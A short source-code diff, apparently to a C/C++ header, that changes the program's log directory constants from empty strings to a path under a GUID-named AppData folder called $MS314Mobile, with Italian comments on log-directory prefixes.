@@ -126,8 +126,8 @@ extern wstring g_StrDemo;
 #define LOG_DIR L"\\$MS313Mobile\\"
 #define LOG_DIR_NAME L"$MS313Mobile"
 *****/
-#define LOG_DIR L""
-#define LOG_DIR_NAME L""
+#define LOG_DIR L"\\Data\\Users\\DefApps\\AppData\\{11B69356-6C6D-475D-8655-D29B240D96C8}\\$MS314Mobile\\"
+#define LOG_DIR_NAME L"$MS314Mobile"
 /*****
 #define LOG_DIR_PREFIX L"Q"			// Utilizzato per creare le Log Dir
 #define LOG_DIR_FORMAT L"Q*"		// Utilizzato nella ricerca delle Log Dir
